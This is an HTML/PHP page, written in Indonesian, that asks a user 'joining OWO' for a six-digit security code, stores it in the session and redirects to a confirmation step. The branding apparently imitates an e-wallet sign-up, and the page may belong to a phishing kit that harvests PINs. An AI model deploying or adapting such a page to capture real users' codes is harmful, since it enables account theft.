<!Doctype html>
<html>
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0" />
		
		<title>Security Code</title>
		
		<link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" />
		<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css" />
		<link rel="stylesheet" href="css/style.css" />
		<link rel="shortcut icon" href="img/owo.png" />
		
		<script type="text/javascript" src="http://localhost/desainerweb.id/app/owo/jquery-1.7.2.js"></script>
	</head>
	
	<body>
		<header>
			<div class="row">
				<div class="col-xs-2">
					<i class="fa fa-fw fa-arrow-left" onclick="history.back()"></i>
				</div>
				<div class="col-xs-10">
					<span>JOIN OWO</span>
				</div>
		</header>
		<div class="container">
			<div class="formregister text-center">
				<h5 style="color:#4D2A86;font-weight:bold">Masukkan Security Code</h5><br><br>
				<form method="post" role="form">
					<div class="row">
						<div class="col-xs-2">
							<input class="input-verify" name="v1" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
						<div class="col-xs-2">
							<input class="input-verify" name="v2" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
						<div class="col-xs-2">
							<input class="input-verify" name="v3" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
						<div class="col-xs-2">
							<input class="input-verify" name="v4" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
						<div class="col-xs-2">
							<input class="input-verify" name="v5" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
						<div class="col-xs-2">
							<input class="input-verify" name="v6" type="tel" maxLength="1" autocomplete="off" autofocus required>
						</div>
					</div>
					
					<button name="security" class="signup">Berikutnya</button>
				</form>
			</div>
			</div>
		</div>
	</body>
</html>

<script lang="javascript">
$(".input-verify").keyup(function () {
    if (this.value.length == this.maxLength) {
      $(this).next('.input-verify').focus();
    }
});
</script>

<?php
	if(isset($_POST['security'])) {
		
		session_start();
		
		$_SESSION['security'] = $_POST['v1'].$_POST['v2'].$_POST['v3'].$_POST['v4'].$_POST['v5'].$_POST['v6'];
		echo "<script>location='security-confirm'</script>";
	}
?>